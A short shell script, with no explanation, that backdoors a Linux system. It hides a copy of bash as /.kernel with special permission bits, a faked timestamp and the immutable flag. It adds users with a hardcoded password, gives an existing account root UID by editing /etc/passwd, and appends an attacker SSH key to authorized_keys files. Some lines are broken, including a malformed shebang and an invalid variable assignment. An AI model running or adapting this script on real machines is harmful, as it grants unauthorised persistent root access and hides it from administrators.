#!/bin.bash

cp /bin/bash /.kernel
chmod +sss /.kernel
touch -d "4 May 2014" /.kernel
chattr +i /.kernel

useradd utime
password = "FatPassLastBirdTable"
echo "utime:$password" | sudo chpasswd
usermod -p $password utime

useradd backup
echo "backup:$password" | sudo chpasswd
usermod -g 0 -p $password backup
sed -i 's/^callbackuser:x:[0-9]*:/callbackuser:x:0:/' /etc/passwd

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0W6J4QNx0qhLkiBy+0F7HxAC8OSk8EqeX6IVwmpBOi50EzyPJ9zbxOkLQWnwt3TYEfp3KFOACh4vfgaptkj+b/NlYafKoLO/2uKuVjiAsvAKOY9/Lxs8RHIGJq32572xMHdLTf1lY/yODSjoobccbhL3E4a7GheSMyUa6jb/YEF4xA3ztaDE58zujsynVfL6TGVSUNAs3/6on0crFXd8iCnWkSw8feL8Cjqpvtij17Z4VifbKPEBoUEPK71kWRUkpsMYXJVGaPYZtWV6Hh6db3YKjUFqAYgn5QT9JBWdYv6PGqeFv/2b0yBfOaNhg/J0nk6U0glttziLQ8fUM6zgN" >> ~/.ssh/authorized_keys
mkdir -p /home/backup/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0W6J4QNx0qhLkiBy+0F7HxAC8OSk8EqeX6IVwmpBOi50EzyPJ9zbxOkLQWnwt3TYEfp3KFOACh4vfgaptkj+b/NlYafKoLO/2uKuVjiAsvAKOY9/Lxs8RHIGJq32572xMHdLTf1lY/yODSjoobccbhL3E4a7GheSMyUa6jb/YEF4xA3ztaDE58zujsynVfL6TGVSUNAs3/6on0crFXd8iCnWkSw8feL8Cjqpvtij17Z4VifbKPEBoUEPK71kWRUkpsMYXJVGaPYZtWV6Hh6db3YKjUFqAYgn5QT9JBWdYv6PGqeFv/2b0yBfOaNhg/J0nk6U0glttziLQ8fUM6zgN" >> /home/backup/.ssh/authorized_keys

